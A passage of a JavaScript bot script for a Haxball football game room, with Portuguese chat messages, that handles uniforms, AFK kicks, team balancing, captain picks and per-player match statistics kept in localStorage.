180,"curveF": 6.123233995736766e-17,"cMask": ["red","blue"],"cGroup": ["blueKO"],"color": "F8F8F8"},{"v0": 6,"v1": 5,"bCoef": 0.1,"curve": 180,"curveF": 6.123233995736766e-17,"cMask": ["red","blue"],"cGroup": ["redKO"],"color": "F8F8F8"},{"v0": 6,"v1": 7,"bCoef": 0.1,"vis": false,"cMask": ["red","blue"],"cGroup": ["redKO","blueKO"]},{"v0": 16,"v1": 17,"bCoef": 1.25,"cMask": ["ball"],"color": "F8F8F8"},{"v0": 18,"v1": 19,"bCoef": 1.25,"cMask": ["ball"],"color": "F8F8F8"},{"v0": 22,"v1": 23,"bCoef": 1.25,"cMask": ["ball"],"color": "F8F8F8"},{"v0": 24,"v1": 25,"bCoef": 1.25,"cMask": ["ball"],"color": "F8F8F8"},{"v0": 26,"v1": 27,"bCoef": 0,"cMask": ["ball"],"color": "F8F8F8"},{"v0": 28,"v1": 29,"bCoef": 2,"cMask": ["ball"],"color": "F8F8F8"},{"v0": 30,"v1": 31,"bCoef": 0.1,"cMask": ["red","blue"],"cGroup": ["redKO","blueKO"],"color": "F8F8F8"},{"v0": 32,"v1": 33,"bCoef": 0.1,"cMask": ["red","blue"],"cGroup": ["redKO","blueKO"],"color": "F8F8F8"},{"v0": 42,"v1": 43,"vis": false,"cMask": ["ball"],"color": "F8F8F8"},{"v0": 44,"v1": 45,"vis": false,"cMask": ["ball"],"color": "F8F8F8"},{"v0": 46,"v1": 47,"vis": false,"cMask": ["ball"],"color": "F8F8F8"},{"v0": 49,"v1": 50,"vis": false,"cMask": ["ball"],"color": "F8F8F8"},{"v0": 51,"v1": 52,"vis": false,"cMask": ["ball"],"color": "F8F8F8"},{"v0": 54,"v1": 53,"bCoef": 0.1,"curve": 89.99999999999996,"curveF": 1.0000000000000007,"cMask": ["blue"],"cGroup": ["redKO"],"color": "F8F8F8"},{"v0": 56,"v1": 55,"bCoef": 0.1,"curve": 10,"curveF": 11.430052302761343,"cMask": ["blue"],"cGroup": ["redKO"],"color": "F8F8F8"},{"v0": 58,"v1": 57,"bCoef": 0.1,"curve": 89.99999999999996,"curveF": 1.0000000000000007,"cMask": ["blue"],"cGroup": ["redKO"],"color": "F8F8F8"},{"v0": 59,"v1": 60,"bCoef": 0.1,"curve": 89.99999999999996,"curveF": 1.0000000000000007,"cMask": ["red"],"cGroup": ["redKO"],"color": "F8F8F8"},{"v0": 61,"v1": 62,"bCoef": 0.1,"curve": 10,"curveF": 11.430052302761343,"cMask": ["red"],"cGroup": ["redKO"],"color": "F8F8F8"},{"v0": 63,"v1": 64,"bCoef": 0.1,"curve": 89.99999999999996,"curveF": 1.0000000000000007,"cMask": ["red"],"cGroup": ["redKO"],"color": "F8F8F8"},{"v0": 65,"v1": 66,"bCoef": 0.1,"cMask": ["blue"],"cGroup": ["redKO"],"color": "F8F8F8"},{"v0": 67,"v1": 68,"bCoef": 0.1,"cMask": ["red"],"cGroup": ["redKO"],"color": "F8F8F8"},{"v0": 69,"v1": 70,"vis": false,"cMask": ["ball"],"color": "F8F8F8"},{"v0": 71,"v1": 72,"vis": false,"cMask": ["ball"],"color": "F8F8F8"},{"v0": 73,"v1": 74,"vis": false,"cMask": ["ball"],"color": "F8F8F8"},{"v0": 75,"v1": 76,"vis": false,"cMask": ["ball"],"color": "F8F8F8"},{"v0": 77,"v1": 78,"vis": false,"cMask": ["ball"],"color": "F8F8F8"},{"v0": 79,"v1": 80,"vis": false,"cMask": ["ball"],"color": "F8F8F8"},{"v0": 81,"v1": 82,"vis": false,"cMask": ["ball"],"color": "F8F8F8"},{"v0": 83,"v1": 84,"vis": false,"cMask": ["ball"],"color": "F8F8F8"},{"v0": 85,"v1": 86,"vis": false,"cMask": ["ball"],"color": "F8F8F8"},{"v0": 87,"v1": 88,"vis": false,"cMask": ["ball"],"color": "F8F8F8"},{"v0": 89,"v1": 90,"vis": false,"cMask": ["ball"],"color": "F8F8F8"},{"v0": 91,"v1": 92,"vis": false,"cMask": ["ball"],"color": "F8F8F8"},{"v0": 93,"v1": 94,"bCoef": 2,"cMask": ["ball"],"color": "F8F8F8"}],"planes": [{"normal": [0,1],"dist": -320,"cMask": ["ball"]},{"normal": [0,-1],"dist": -317.5,"cMask": ["ball"]},{"normal": [0,1],"dist": -350,"bCoef": 0.1},{"normal": [0,-1],"dist": -350,"bCoef": 0.1},{"normal": [1,0],"dist": -800,"bCoef": 0.1},{"normal": [-1,0],"dist": -800,"bCoef": 0.1}],"goals": [{"p0": [-707,-94],"p1": [-707,86],"team": "red"},{"p0": [706,90],"p1": [706,-90],"team": "blue"}],"discs": [{"radius": 6.25,"bCoef": 0.4,"invMass": 1.5,"color": "FFCC00","cGroup": ["ball","kick","score"]},{"pos": [-700,89],"radius": 6,"invMass": 0,"color": "FF0000"},{"pos": [-700,-99],"radius": 6,"invMass": 0,"color": "FF0000"},{"pos": [700,90],"radius": 6,"invMass": 0,"color": "33FF"},{"pos": [701,-89],"radius": 6,"invMass": 0,"color": "33FF"}],"playerPhysics": {"bCoef": 0,"acceleration": 0.11,"kickingAcceleration": 0.083},"ballPhysics": "disc0","spawnDistance": 350}'; // Read above

/* OPTIONS */

var afkLimit = 12;
var drawTimeLimit = Infinity;
var maxTeamSize = 4; // This works for 1 (you might want to adapt things to remove some useless stats in 1v1 like assist or cs), 2, 3 or 4
var slowMode = 0;

/* UNIFORMES */

var uniformes = [
	'0 66FF00 000000 FFFFFF',
	'0 FFCC00 000052 7A0000 000052',
    '0 FFFFFF 0FFFFF 247477',
    '0 FFFFFF FF0808',
    '26 000000 FFFFFF DE0707 FFFFFF',
    '0 141414 000000'

	// adicione quantos quiser, no formato: "angulo cor1 cor2 cor3 cor4"
];

var currentRedUniform = "";
var currentBlueUniform = "";

/* PLAYERS */

const Team = { SPECTATORS: 0, RED: 1, BLUE: 2 };
var extendedP = [];
const eP = { ID: 0, AUTH: 1, CONN: 2, AFK: 3, ACT: 4, GK: 5, MUTE: 6 };
const Ss = { GA: 0, WI: 1, DR: 2, LS: 3, WR: 4, GL: 5, AS: 6, GK: 7, CS: 8, CP: 9, RL: 10, NK: 11}
var players;
var teamR;
var teamB;
var teamS;

/* GAME */

var lastTeamTouched;
var lastPlayersTouched; // These allow to get good goal notifications (it should be lastPlayersKicked, waiting on a next update to get better track of shots on target)
var countAFK = false; // Created to get better track of activity
var activePlay = false; // Created to get better track of the possession
var goldenGoal = false;
var SMSet = new Set(); // Set created to get slow mode which is useful in chooseMode
var banList = []; // Getting track of the bans, so we can unban ppl if we want

/* STATS */

var game;
var GKList = ["",""];
var Rposs = 0;
var Bposs = 0;
var point = [{"x": 0, "y": 0}, {"x": 0, "y": 0}]; // created to get ball speed
var ballSpeed;
var vcgbsdbf = 7865;
var lastWinner = Team.SPECTATORS;
var streak = 0;
var allBlues = []; // This is to count the players who should be counted for the stats. This includes players who left after the game has started, doesn't include those who came too late or ...
var allReds = []; // ... those who came in a very unequal game.

/* BALANCE & CHOOSE */

var inChooseMode = false; // This variable enables to distinguish the 2 phases of playing and choosing which should be dealt with very differently
var redCaptainChoice = "";
var blueCaptainChoice = "";
var chooseTime = 20;
var timeOutCap;

/* AUXILIARY */

var checkTimeVariable = false; // This is created so the chat doesn't get spammed when a game is ending via timeLimit
var statNumber = 0; // This allows the room to be given stat information every X minutes
var endGameVariable = false; // This variable with the one below helps distinguish the cases where games are stopped because they have finished to the ones where games are stopped due to player movements or resetting teams
var resettingTeams = false;
var capLeft = false;
var statInterval = 6;

loadMap(aloneMap, 0, 0);

/* OBJECTS */

function Goal(time, team, striker, assist) {
	this.time = time;
	this.team = team;
	this.striker = striker;
	this.assist = assist;
}

function Game(date, scores, goals) {
	this.date = date;
	this.scores = scores;
	this.goals = goals;
}

/* FUNCTIONS */

/* AUXILIARY FUNCTIONS */

function getRandomInt(max) { // returns a random number from 0 to max-1
	return Math.floor(Math.random() * Math.floor(max)); 
}

function parseUniform(uniformStr) {
	var parts = uniformStr.split(/ +/);
	var angle = Number.parseInt(parts[0]);
	var colors = [];
	for (var i = 1; i < parts.length; i++) {
		colors.push(Number.parseInt(parts[i], 16));
	}
	return { angle: angle, colors: colors };
}

function applyUniform(team, uniformStr) {
	var parsed = parseUniform(uniformStr);
	// room.setTeamColors(team, parsed.angle, parsed.colors);
}

function getRandomUniform(excludeList) {
	var available = uniformes.filter((u) => excludeList.indexOf(u) == -1);
	if (available.length == 0) {
		available = uniformes; // fallback caso tudo esteja excluído
	}
	return available[getRandomInt(available.length)];
}

function randomizeUniforms() {
	currentRedUniform = getRandomUniform([]);
	currentBlueUniform = getRandomUniform([currentRedUniform]);
	applyUniform(Team.RED, currentRedUniform);
	applyUniform(Team.BLUE, currentBlueUniform);
}

function getTime(scores) { // returns the current time of the game
	return "[" + Math.floor(Math.floor(scores.time/60)/10).toString() + Math.floor(Math.floor(scores.time/60)%10).toString() + ":" + Math.floor(Math.floor(scores.time - (Math.floor(scores.time/60) * 60))/10).toString() + Math.floor(Math.floor(scores.time - (Math.floor(scores.time/60) * 60))%10).toString() + "]"
}

function pointDistance(p1, p2) {
	var d1 = p1.x - p2.x;
	var d2 = p1.y - p2.y;
	return Math.sqrt(d1 * d1 + d2 * d2);
}

/* BUTTONS */

function topBtn() {
	if (teamS.length == 0) {
		return;
	}
	else {
		if (teamR.length == teamB.length) {
			if (teamS.length > 1) {
				room.setPlayerTeam(teamS[0].id, Team.RED);
				room.setPlayerTeam(teamS[1].id, Team.BLUE);
			}
			return;
		}
		else if (teamR.length < teamB.length) {
			room.setPlayerTeam(teamS[0].id, Team.RED);
		}
		else {
			room.setPlayerTeam(teamS[0].id, Team.BLUE);
		}
	}
}

function randomBtn() {
	if (teamS.length == 0) {
		return;
	}
	else {
		if (teamR.length == teamB.length) {
			if (teamS.length > 1) {
				var r = getRandomInt(teamS.length);
				room.setPlayerTeam(teamS[r].id, Team.RED);
				teamS = teamS.filter((spec) => spec.id != teamS[r].id);
				room.setPlayerTeam(teamS[getRandomInt(teamS.length)].id, Team.BLUE);
			}
			return;
		}
		else if (teamR.length < teamB.length) {
			room.setPlayerTeam(teamS[getRandomInt(teamS.length)].id, Team.RED);
		}
		else {
			room.setPlayerTeam(teamS[getRandomInt(teamS.length)].id, Team.BLUE);
		}
	}
}

function blueToSpecBtn() {
	resettingTeams = true;
	setTimeout(() => { resettingTeams = false; }, 100);
	for (var i = 0; i < teamB.length; i++) {
		room.setPlayerTeam(teamB[teamB.length - 1 - i].id, Team.SPECTATORS);
	}
}

function redToSpecBtn() {
	resettingTeams = true;
	setTimeout(() => { resettingTeams = false; }, 100);
	for (var i = 0; i < teamR.length; i++) {
		room.setPlayerTeam(teamR[teamR.length - 1 - i].id, Team.SPECTATORS);
	}
}

function resetBtn() {
	resettingTeams = true;
	setTimeout(() => { resettingTeams = false; }, 100);
	if (teamR.length <= teamB.length) {
		for (var i = 0; i < teamR.length; i++) {
			room.setPlayerTeam(teamB[teamB.length - 1 - i].id, Team.SPECTATORS);
			room.setPlayerTeam(teamR[teamR.length - 1 - i].id, Team.SPECTATORS);
		}
		for (var i = teamR.length; i < teamB.length; i++) {
			room.setPlayerTeam(teamB[teamB.length - 1 - i].id, Team.SPECTATORS);
		}
	}
	else {
		for (var i = 0; i < teamB.length; i++) {
			room.setPlayerTeam(teamB[teamB.length - 1 - i].id, Team.SPECTATORS);
			room.setPlayerTeam(teamR[teamR.length - 1 - i].id, Team.SPECTATORS);
		}
		for (var i = teamB.length; i < teamR.length; i++) {
			room.setPlayerTeam(teamR[teamR.length - 1 - i].id, Team.SPECTATORS);
		}
	}
}

function blueToRedBtn() {
	resettingTeams = true;
	setTimeout(() => { resettingTeams = false; }, 100);
	for (var i = 0; i < teamB.length; i++) {
		room.setPlayerTeam(teamB[i].id, Team.RED);
	}
}

/* GAME FUNCTIONS */

function checkTime() {
	const scores = room.getScores();
	game.scores = scores;
	if (Math.abs(scores.time - scores.timeLimit) <= 0.01 && scores.timeLimit != 0) {
		if (scores.red != scores.blue) {
			if (checkTimeVariable == false) {
				checkTimeVariable = true;
				setTimeout(() => { checkTimeVariable = false; }, 3000);
				scores.red > scores.blue ? endGame(Team.RED) : endGame(Team.BLUE);
				setTimeout(() => { room.stopGame(); }, 2000);
			}
			return;
		}
		goldenGoal = true;
		room.sendChat("⚽ Primeiro gol vence!");
	}
	if (Math.abs(drawTimeLimit * 60 - scores.time - 60) <= 0.01 && players.length > 2) {
		if (checkTimeVariable == false) {
			checkTimeVariable = true;
			setTimeout(() => { checkTimeVariable = false; }, 10);
			room.sendChat("⌛ 60 segundos restantes até o empate!");
		}
	}
	if (Math.abs(scores.time - drawTimeLimit * 60) <= 0.01 && players.length > 2) {
		if (checkTimeVariable == false) {
			checkTimeVariable = true;
			setTimeout(() => { checkTimeVariable = false; }, 10);
			endGame(Team.SPECTATORS);
			room.stopGame();
			goldenGoal = false;
		}
	}
}

function endGame(winner) { // handles the end of a game : no stopGame function inside
	players.length >= 2 * maxTeamSize - 1 ? activateChooseMode() : null;
	const scores = room.getScores();
	game.scores = scores;
	Rposs = Rposs/(Rposs+Bposs);
	Bposs = 1 - Rposs;
	lastWinner = winner;
	endGameVariable = true;
	if (winner == Team.RED) {
		streak++;
		room.sendChat("🔴 Time Vermelho venceu " + scores.red + "-" + scores.blue + "! Sequência atual: " + streak + " 🏆");
        currentBlueUniform = getRandomUniform([currentRedUniform]);
		applyUniform(Team.BLUE, currentBlueUniform);
	}
	else if (winner == Team.BLUE) {
		streak = 1;
		room.sendChat("🔵 Time Azul venceu " + scores.blue + "-" + scores.red + "! Sequência atual: " + streak + " 🏆");
        currentRedUniform = getRandomUniform([currentBlueUniform]);
		applyUniform(Team.RED, currentRedUniform);
	}
	else {
		streak = 0;
		room.sendChat("💤 Limite de empate atingido! 💤");
    }
    room.sendChat("⭐ Posse de bola: 🔴 " + (Rposs*100).toPrecision(3).toString() + "% : " + (Bposs*100).toPrecision(3).toString() + "% 🔵");
    scores.red == 0 ? (scores.blue == 0 ? room.sendChat("🏆 " + GKList[0].name + " e " + GKList[1].name + " mantiveram o SG! ") : room.sendChat("🏆 " + GKList[1].name + " manteve o SG! ")) : scores.blue == 0 ? room.sendChat("🏆 " + GKList[0].name + " manteve o SG! ") : null;
	updateStats();
}

function quickRestart() {
	room.stopGame();
	setTimeout(() => { room.startGame(); }, 2000);
}

function resumeGame() {
	setTimeout(() => { room.startGame(); }, 2000);
	setTimeout(() => { room.pauseGame(false); }, 1000);
}

function activateChooseMode() {
	inChooseMode = true;
	slowMode = 2;
	room.sendChat("Modo lento de 2 segundos ativado!");
}

function deactivateChooseMode() {
	inChooseMode = false;
	clearTimeout(timeOutCap);
	if (slowMode != 0) {
		slowMode = 0;
		room.sendChat("Modo lento encerrado.");
	}
	redCaptainChoice = "";
	blueCaptainChoice = "";
}

function loadMap(map, scoreLim, timeLim) {
	if (map == aloneMap) {
		room.setCustomStadium(aloneMap);
	}
	else if (map == classicMap) {
		(classicMap != '') ? room.setCustomStadium(classicMap) : room.setDefaultStadium("Classic");
	}
	else if (map == bigMap) {
		(bigMap != '.') ? room.setCustomStadium(bigMap) : room.setDefaultStadium("Big");
	}
	else {
		room.setCustomStadium(map);
	}
	room.setScoreLimit(scoreLim);
	room.setTimeLimit(timeLim);
}

/* PLAYER FUNCTIONS */

function updateTeams() { // update the players' list and all the teams' list
	players = room.getPlayerList().filter((player) => player.id != 0 && !getAFK(player));
	teamR = players.filter(p => p.team === Team.RED);
	teamB = players.filter(p => p.team === Team.BLUE);
	teamS = players.filter(p => p.team === Team.SPECTATORS);
}

function handleInactivity() { // handles inactivity : players will be kicked after afkLimit
	if (countAFK && (teamR.length + teamB.length) > 1) {
		for (var i = 0; i < teamR.length ; i++) {
			setActivity(teamR[i], getActivity(teamR[i]) + 1);
		}
		for (var i = 0; i < teamB.length ; i++) {
			setActivity(teamB[i], getActivity(teamB[i]) + 1);
		}
	}
	for (var i = 0; i < extendedP.length ; i++) {
		if (extendedP[i][eP.ACT] == 60 * (2/3 * afkLimit)) {
			room.sendChat("[PV] ⛔ @" + room.getPlayer(extendedP[i][eP.ID]).name + ", se você não se mover ou enviar uma mensagem nos próximos " + Math.floor(afkLimit / 3) + " segundos, será expulso!", extendedP[i][eP.ID]);
		}
		if (extendedP[i][eP.ACT] >= 60 * afkLimit) {
			extendedP[i][eP.ACT] = 0;
            if (room.getScores().time <= afkLimit - 0.5) {
				setTimeout(() => { !inChooseMode ? quickRestart() : room.stopGame(); }, 10);
			}
			room.kickPlayer(extendedP[i][eP.ID], "AFK", false);
		}
	}
}

function getAuth(player) {
	return extendedP.filter((a) => a[0] == player.id) != null ? extendedP.filter((a) => a[0] == player.id)[0][eP.AUTH] : null;
}

function getAFK(player) {
	return extendedP.filter((a) => a[0] == player.id) != null ? extendedP.filter((a) => a[0] == player.id)[0][eP.AFK] : null;
}

function setAFK(player, value) {
	extendedP.filter((a) => a[0] == player.id).forEach((player) => player[eP.AFK] = value);
}

function getActivity(player) {
	return extendedP.filter((a) => a[0] == player.id) != null ? extendedP.filter((a) => a[0] == player.id)[0][eP.ACT] : null;
}

function setActivity(player, value) {
	extendedP.filter((a) => a[0] == player.id).forEach((player) => player[eP.ACT] = value);
}

function getGK(player) {
	return extendedP.filter((a) => a[0] == player.id) != null ? extendedP.filter((a) => a[0] == player.id)[0][eP.GK] : null;
}

function setGK(player, value) {
	extendedP.filter((a) => a[0] == player.id).forEach((player) => player[eP.GK] = value);
}

function getMute(player) {
	return extendedP.filter((a) => a[0] == player.id) != null ? extendedP.filter((a) => a[0] == player.id)[0][eP.MUTE] : null;
}

function setMute(player, value) {
	extendedP.filter((a) => a[0] == player.id).forEach((player) => player[eP.MUTE] = value);
}

/* BALANCE & CHOOSE FUNCTIONS */

function updateRoleOnPlayerIn() {
	updateTeams();
	if (inChooseMode) {
		if (players.length == 6) {
			loadMap(bigMap, scoreLimitBig, timeLimitBig);
		}
		getSpecList(teamR.length <= teamB.length ? teamR[0] : teamB[0]);
	}
	balanceTeams();
}

function updateRoleOnPlayerOut() {
    updateTeams();
	if (room.getScores() != null) {
		var scores = room.getScores();
		if (players.length >= 2 * maxTeamSize && scores.time >= (5/6) * game.scores.timeLimit && teamR.length != teamB.length) {
			if (teamR.length < teamB.length) {
				if (scores.blue - scores.red == 2) {
					endGame(Team.BLUE);
					room.sendChat("🤖 Ragequit detectado. Jogo encerrado 🤖");
					setTimeout(() => { room.stopGame(); }, 100);
					return;
				}
			}
			else {
				if (scores.red - scores.blue == 2) {
					endGame(Team.RED);
					room.sendChat("🤖 Ragequit detectado. Jogo encerrado 🤖");
					setTimeout(() => { room.stopGame(); }, 100);
					return;
				}
			}
		}
	}
	if (inChooseMode) {
		if (players.length == 5) {
			loadMap(classicMap, scoreLimitClassic, timeLimitClassic);
		}
		if (teamR.length == 0 || teamB.length == 0) {
			teamR.length == 0 ? room.setPlayerTeam(teamS[0].id, Team.RED) : room.setPlayerTeam(teamS[0].id, Team.BLUE);
			return;
		}
		if (Math.abs(teamR.length - teamB.length) == teamS.length) {
			room.sendChat("🤖 Sem escolhas restantes, deixe-me resolver esta situação... 🤖");
			deactivateChooseMode();
			resumeGame();
			var b = teamS.length;
			if (teamR.length > teamB.length) {
				for (var i = 0 ; i < b ; i++) {
					setTimeout(() => { room.setPlayerTeam(teamS[0].id, Team.BLUE); }, 5*i);
				}
			}
			else {
				for (var i = 0 ; i < b ; i++) {
					setTimeout(() => { room.setPlayerTeam(teamS[0].id, Team.RED); }, 5*i);
				}
			}
			return;
		}
		if (streak == 0 && room.getScores() == null) {
			if (Math.abs(teamR.length - teamB.length) == 2) { // if someone left a team has 2 more players than the other one, put the last chosen guy back in his place so it's fair
				room.sendChat("🤖 Balanceando times... 🤖");
				teamR.length > teamB.length ? room.setPlayerTeam(teamR[teamR.length - 1].id, Team.SPECTATORS) : room.setPlayerTeam(teamB[teamB.length - 1].id, Team.SPECTATORS);
			}
		}
		if (teamR.length == teamB.length && teamS.length < 2) {
			deactivateChooseMode();
			resumeGame();
			return;
		}
		capLeft ? choosePlayer() : getSpecList(teamR.length <= teamB.length ? teamR[0] : teamB[0]);
	}
	balanceTeams();
}

function balanceTeams() {
	if (!inChooseMode) {
		if (players.length == 1 && teamR.length == 0) {
            quickRestart();
            loadMap(aloneMap, 0, 0);
			room.setPlayerTeam(players[0].id, Team.RED);
		}
		else if (Math.abs(teamR.length - teamB.length) == teamS.length && teamS.length > 0) {
			const n = Math.abs(teamR.length - teamB.length);
			if (players.length == 2) {
				quickRestart();
				loadMap(classicMap, scoreLimitClassic, timeLimitClassic);
			}
			if (teamR.length > teamB.length) {
				for (var i = 0 ; i < n ; i++) {
					room.setPlayerTeam(teamS[i].id, Team.BLUE);
				}
			}
			else {
				for (var i = 0 ; i < n ; i++) {
					room.setPlayerTeam(teamS[i].id, Team.RED);
				}
			}
		}
		else if (Math.abs(teamR.length - teamB.length) > teamS.length) {
			const n = Math.abs(teamR.length - teamB.length);
			if (players.length == 1) {
				quickRestart();
				loadMap(aloneMap, 0, 0);
				room.setPlayerTeam(players[0].id, Team.RED);
				return;
			}
			else if (players.length == 5) {
				quickRestart();
				loadMap(classicMap, scoreLimitClassic, timeLimitClassic);
			}
			if (players.length == maxTeamSize * 2 - 1) {
				allReds = [];
				allBlues = [];
			}
			if (teamR.length > teamB.length) {
				for (var i = 0 ; i < n ; i++) {
					room.setPlayerTeam(teamR[teamR.length - 1 - i].id, Team.SPECTATORS);
				}
			}
			else {
				for (var i = 0 ; i < n ; i++) {
					room.setPlayerTeam(teamB[teamB.length - 1 - i].id, Team.SPECTATORS);
				}
			}
		}
		else if (Math.abs(teamR.length - teamB.length) < teamS.length && teamR.length != teamB.length) {
			room.pauseGame(true);
			activateChooseMode();
			choosePlayer();
		}
		else if (teamS.length >= 2 && teamR.length == teamB.length && teamR.length < maxTeamSize) {
			if (teamR.length == 2) {
				quickRestart();
				loadMap(bigMap, scoreLimitBig, timeLimitBig);
			}
			topBtn();
		}
	}
}

function choosePlayer() {
	clearTimeout(timeOutCap);
	if (teamR.length <= teamB.length && teamR.length != 0) {
		room.sendChat("[PV] Para escolher um jogador, digite o número dele na lista ou use 'top', 'random' ou 'bottom'.", teamR[0].id);
		timeOutCap = setTimeout(function (player) { room.sendChat("[PV] Rápido @" + player.name + ", restam apenas " + Number.parseInt(chooseTime / 2) + " segundos para escolher!", player.id); timeOutCap = setTimeout(function (player) { room.kickPlayer(player.id, "Você não escolheu a tempo!", false); }, chooseTime * 500, teamR[0]); }, chooseTime * 1000, teamR[0]);
	}
	else if (teamB.length < teamR.length && teamB.length != 0) {
		room.sendChat("[PV] Para escolher um jogador, digite o número dele na lista ou use 'top', 'random' ou 'bottom'.", teamB[0].id);
		timeOutCap = setTimeout(function (player) { room.sendChat("[PV] Rápido @" + player.name + ", restam apenas " + Number.parseInt(chooseTime / 2) + " segundos para escolher!", player.id); timeOutCap = setTimeout(function (player) { room.kickPlayer(player.id, "Você não escolheu a tempo!", false); }, chooseTime * 500, teamB[0]); }, chooseTime * 1000, teamB[0]);
	}
	if (teamR.length != 0 && teamB.length != 0) getSpecList(teamR.length <= teamB.length ? teamR[0] : teamB[0]);
}

function getSpecList(player) {
	var cstm = "[PV] Jogadores: ";
	for (var i = 0 ; i < teamS.length ; i++) {
		if (140 - cstm.length < (teamS[i].name + "[" + (i+1) + "], ").length) {
			room.sendChat(cstm, player.id);
			cstm = "... ";
		}
		cstm += teamS[i].name + "[" + (i+1) + "], ";
	}
	cstm = cstm.substring(0,cstm.length - 2);
	cstm += ".";
	room.sendChat(cstm, player.id);
}

/* STATS FUNCTIONS */

function getLastTouchOfTheBall() {
	const ballPosition = room.getBallPosition();
	updateTeams();
	for (var i = 0; i < players.length; i++) {
		if (players[i].position != null) {
			var distanceToBall = pointDistance(players[i].position, ballPosition);
			if (distanceToBall < triggerDistance) {
				!activePlay ? activePlay = true : null;
				if (lastTeamTouched == players[i].team && lastPlayersTouched[0] != null && lastPlayersTouched[0].id != players[i].id) {
					lastPlayersTouched[1] = lastPlayersTouched[0];
					lastPlayersTouched[0] = players[i];
				}
				lastTeamTouched = players[i].team;
			}
		}
	}
}

function getStats() { // gives possession, ball speed and GK of each team
	if (activePlay) {
		updateTeams();
		lastTeamTouched == Team.RED ? Rposs++ : Bposs++;
		var ballPosition = room.getBallPosition();
		point[1] = point[0];
		point[0] = ballPosition;
		ballSpeed = (pointDistance(point[0], point[1]) * 60 * 60 * 60)/15000;
		var k = [-1, Infinity];
		for (var i = 0; i < teamR.length; i++) {
			if (teamR[i].position.x < k[1]) {
				k[0] = teamR[i];
				k[1] = teamR[i].position.x;
			}
		}
		k[0] != -1 ? setGK(k[0], getGK(k[0]) + 1) : null;
		k = [-1, -Infinity];
		for (var i = 0; i < teamB.length; i++) {
			if (teamB[i].position.x > k[1]) {
				k[0] = teamB[i];
				k[1] = teamB[i].position.x;
			}
		}
		k[0] != -1 ? setGK(k[0], getGK(k[0]) + 1) : null;
		findGK();
	}
}

function updateStats() {
	if (players.length >= 2 * maxTeamSize && (game.scores.time >= (5 / 6) * game.scores.timeLimit || game.scores.red == game.scores.scoreLimit || game.scores.blue == game.scores.scoreLimit) && allReds.length >= maxTeamSize && allBlues.length >= maxTeamSize) {
		var stats;
		for (var i = 0; i < allReds.length; i++) {
			localStorage.getItem(getAuth(allReds[i])) ? stats = JSON.parse(localStorage.getItem(getAuth(allReds[i]))) : stats = [0, 0, 0, 0, "0.00", 0, 0, 0, 0, "0.00", "player", allReds[i].name];
			stats[Ss.GA]++;
			lastWinner == Team.RED ? stats[Ss.WI]++ : lastWinner == Team.BLUE ? stats[Ss.LS]++ : stats[Ss.DR]++;
			stats[Ss.WR] = (100 * stats[Ss.WI] / stats[Ss.GA]).toPrecision(3);
			localStorage.setItem(getAuth(allReds[i]), JSON.stringify(stats));
		}
		for (var i = 0; i < allBlues.length; i++) {
			localStorage.getItem(getAuth(allBlues[i])) ? stats = JSON.parse(localStorage.getItem(getAuth(allBlues[i]))) : stats = [0, 0, 0, 0, "0.00", 0, 0, 0, 0, "0.00", "player", allBlues[i].name];
			stats[Ss.GA]++;
			lastWinner == Team.BLUE ? stats[Ss.WI]++ : lastWinner == Team.RED ? stats[Ss.LS]++ : stats[Ss.DR]++;
			stats[Ss.WR] = (100 * stats[Ss.WI] / stats[Ss.GA]).toPrecision(3);
			localStorage.setItem(getAuth(allBlues[i]), JSON.stringify(stats));
		}
		for (var i = 0; i < game.goals.length; i++) {
			if (game.goals[i].striker != null) {
				if ((allBlues.concat(allReds)).findIndex((player) => player.id == game.goals[i].striker.id) != -1) {
					stats = JSON.parse(localStorage.getItem(getAuth(game.goals[i].striker)));
					stats[Ss.GL]++;
					localStorage.setItem(getAuth(game.goals[i].striker), JSON.stringify(stats));
				}
			}
			if (game.goals[i].assist != null) {
				if ((allBlues.concat(allReds)).findIndex((player) => player.name == game.goals[i].assist.name) != -1) {
					stats = JSON.parse(localStorage.getItem(getAuth(game.goals[i].assist)));
					stats[Ss.AS]++;
					localStorage.setItem(getAuth(game.goals[i].assist), JSON.stringify(stats));
				}
			}
		}
		if (allReds.findIndex((player) => player.id == GKList[0].id) != -1) {
			stats = JSON.parse(localStorage.getItem(getAuth(GKList[0])));
			stats[Ss.GK]++;
			game.scores.blue == 0 ? stats[Ss.CS]++ : null;
			stats[Ss.CP] = (100 * stats[Ss.CS] / stats[Ss.GK]).toPrecision(3);
			localStorage.setItem(getAuth(GKList[0]), JSON.stringify(stats));
		}
		if (allBlues.findIndex((player) => player.id == GKList[1].id) != -1) {
			stats = JSON.parse(localStorage.getItem(getAuth(GKList[1])));
			stats[Ss.GK]++;
			game.scores.red == 0 ? stats[Ss.CS]++ : null;
			stats[Ss.CP] = (100 * stats[Ss.CS] / stats[Ss.GK]).toPrecision(3);
			localStorage.setItem(getAuth(GKList[1]), JSON.stringify(stats));
		}
	}
}

function findGK() {
	var tab = [[-1,""], [-1,""]];
	for (var i = 0; i < extendedP.length ; i++) {
		if (room.getPlayer(extendedP[i][eP.ID]) != null && room.getPlayer(extendedP[i][eP.ID]).team == Team.RED) {
			if (tab[0][0] < extendedP[i][eP.GK]) {
				tab[0][0] = extendedP[i][eP.GK];
				tab[0][1] = room.getPlayer(extendedP[i][eP.ID]);
			}
		}
		else if (room.getPlayer(extendedP[i][eP.ID]) != null && room.getPlayer(extendedP[i][eP.ID]).team == Team.BLUE) {
			if (tab[1][0] < extendedP[i][eP.GK]) {
				tab[1][0] = extendedP[i][eP.GK];
				tab[1][1] = room.getPlayer(extendedP[i][eP.ID]);
			}
		}
	}
	GKList = [tab[0][1], tab[1][1]];
}

setInterval(() => {
	var tableau = [];
	if (statNumber % 5 == 0) {
		Object.keys(localStorage).forEach(function (key) { if (!["player_name", "view_mode", "geo", "avatar", "player_auth_key"].includes(key)) { tableau.push([(JSON.parse(localStorage.getItem(key))[Ss.NK]), (JSON.parse(localStorage.getItem(key))[Ss.GA])]); } });
		if (tableau.length < 5) {
			return false;
		}
		tableau.sort(function (a, b) { return b[1] - a[1]; });
		room.sendChat("Jogos> #1 " + tableau[0][0] + ": " + tableau[0][1] + " #2 " + tableau[1][0] + ": " + tableau[1][1] + " #3 " + tableau[2][0] + ": " + tableau[2][1] + " #4 " + tableau[3][0] + ": " + tableau[3][1] + " #5 " + tableau[4][0] + ": " + tableau[4][1]);
	}
	if (statNumber % 5 == 1) {
		Object.keys(localStorage).forEach(function (key) { if (!["player_name", "view_mode", "geo", "avatar", "player_auth_key"].includes(key)) { tableau.push([(JSON.parse(localStorage.getItem(key))[Ss.NK]), (JSON.parse(localStorage.getItem(key))[Ss.WI])]); } });
		if (tableau.length < 5) {
